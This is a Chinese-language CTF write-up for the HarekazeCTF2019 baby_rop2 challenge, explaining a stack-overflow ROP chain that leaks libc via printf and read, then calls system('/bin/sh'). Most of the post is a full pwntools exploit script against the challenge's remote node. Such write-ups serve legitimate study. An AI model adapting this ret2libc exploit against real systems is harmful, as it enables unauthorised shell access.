---
title: HarekazeCTF2019 baby_rop2
tags: [ctf-pwn,exp]
date: 2023-4-21 11:24
categories: [ctf-pwn]
excerpt: exp
---

**题目**

<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2>

和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的

前一个文章地址：https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/

**方法**

这道题目的差别或值得注意的地方在于

1. 不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链

   printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的`pop rsi, ret`的代码，只有一个`pop rsi, pop r15, ret`，因此需要再额外给r15在栈上留出一个空间。详见exp代码。

2. 用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题

**Exp**

```python
from pwn import *
from LibcSearcher import *

#p = process('./babyrop2')
p = remote("node4.buuoj.cn",29507)

elf = ELF('./babyrop2')

poprdi_ret = 0x400733
poprsi_popr15_ret = 0x400731
main = elf.sym['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

read_plt = elf.plt['read']
read_got = elf.got['read']

format_str = 0x400790

payload = b'a'*40 + p64(poprdi_ret) + p64(format_str) + \
          p64(poprsi_popr15_ret) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main)

p.sendlineafter("What's your name? ",payload)

read_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print('read_addr:' + hex(read_addr))

libc = LibcSearcher('read', read_addr)
offset = read_addr - libc.dump('read')
binsh = offset + libc.dump('str_bin_sh')
system = offset + libc.dump('system')

payload = b'a'*40 + p64(poprdi_ret) + p64(binsh) + p64(system)

p.sendlineafter("What's your name? ", payload)
p.interactive()
```

